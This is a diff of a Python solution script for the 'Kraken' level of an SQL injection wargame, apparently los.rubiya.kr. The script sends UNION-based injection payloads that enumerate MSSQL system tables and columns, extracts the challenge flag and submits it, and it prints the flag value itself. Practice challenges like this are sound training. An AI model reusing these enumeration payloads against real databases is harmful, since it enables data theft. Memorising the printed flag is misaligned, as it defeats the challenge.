@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 import los
+import los_cookies as lc
 
 
 def main():
-    '''
+    """
     Kraken 45
 
     if(preg_match('/master|information|;/i', $_GET['id'])) exit("No Hack ~_~");
@@ -15,39 +16,34 @@ def main():
 
     if($krakenFlag === $_GET['pw']) solve("kraken");
     // Flag is in `flag_{$hash}` table, not in `member` table. Let's look over whole of the database.
-    '''
+    """
 
     url = "https://los.rubiya.kr/chall/kraken_647f3513b94339a4c59cf6f9074d0f92.php"
-    cook = los.check_cookies(url)
+    cook = lc.check_cookies(url)
+    method = 'get'
+    inj_param = 'pw'
 
-    param = dict(
-        pw="' union select count(name) from sys.sysobjects--")
-    los.resp_with_message(url, param, cook, '9')
+    payload = "' union select count(name) from sys.sysobjects--"
+    p = los.SqlInjection(url, cook, method, inj_param, payload)
+    p.resp_with_message(text='9')
 
-    param = dict(
-        pw="' union select name from sys.sysobjects order by 1 offset 2 rows--")
-    los.resp_with_message(url, param, cook, 'flag')
+    p.payload = "' union select name from sys.sysobjects order by 1 offset 2 rows--"
+    p.resp_with_message(text='flag')
 
-    param = dict(
-        pw="' union select id from sys.sysobjects where name='flag_ccdfe62b'--")
-    los.resp_with_message(url, param, cook, '901578250')
+    p.payload = "' union select id from sys.sysobjects where name='flag_ccdfe62b'--"
+    p.resp_with_message(text='901578250')
 
-    param = dict(
-        pw="' union select name from sys.all_columns where object_id=901578250--")
-    los.resp_with_message(url, param, cook, 'flag')
+    p.payload = "' union select name from sys.all_columns where object_id=901578250--"
+    p.resp_with_message(text='flag')
 
-    param = dict(
-        pw="' union select flag_ab15b600 from flag_ccdfe62b--")
-    los.resp_with_message(url, param, cook, 'FLAG')
+    p.payload = "' union select flag_ab15b600 from flag_ccdfe62b--"
+    p.resp_with_message(text='FLAG')
 
-    param = dict(pw='FLAG{a0819fc56beae985bac7d175c974cd27}')
-    response = los.get_request(url, param, cook)
-
+    p.payload = 'FLAG{a0819fc56beae985bac7d175c974cd27}'
+    response = p.my_request()
     if 'Clear!' in response:
-        print('Kraken Clear!')
+        print('\nKraken Clear!')
 
 
 if __name__ == '__main__':
     main()
-
-
